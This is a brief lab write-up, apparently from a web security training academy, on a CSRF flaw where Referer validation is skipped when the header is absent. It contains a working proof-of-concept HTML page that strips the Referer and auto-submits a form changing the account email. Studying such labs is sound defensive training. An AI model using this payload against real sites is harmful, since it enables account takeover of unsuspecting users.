# Lab: CSRF where Referer validation depends on header being present

- The application is using HTTP `Referer` header as a `CSRF` defense mechanism.
- The defense mechanism fails when `Referer` header is not present in the request.
-  Exploit ->

```html
<html>
  <meta name="referrer" content="never">
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac9c1f3e1fb9a17fc0180bfe00950041.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

```

